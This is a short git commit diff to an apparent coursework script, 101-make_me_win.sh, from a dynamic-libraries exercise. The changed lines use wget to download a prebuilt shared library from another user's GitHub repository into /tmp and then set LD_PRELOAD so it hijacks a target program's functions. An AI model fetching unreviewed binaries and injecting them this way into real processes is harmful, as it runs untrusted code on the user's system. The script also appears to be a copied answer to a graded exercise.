1c5772b7b9c913ba6cede497c11c0c5b3a2c38cb
ObiChika <132351005+ObiChika@users.noreply.github.com>
2023-10-17 03:06:36 +0100

    Update 101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P ../ https://raw.githubusercontent.com/CletsyMedia/alx-low_level_programming/master/0x18-dynamic_libraries/data/libhack.so
-export LD_PRELOAD=../libhack.so
+wget -P /tmp https://github.com/Tolulope05/alx-low_level_programming/raw/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
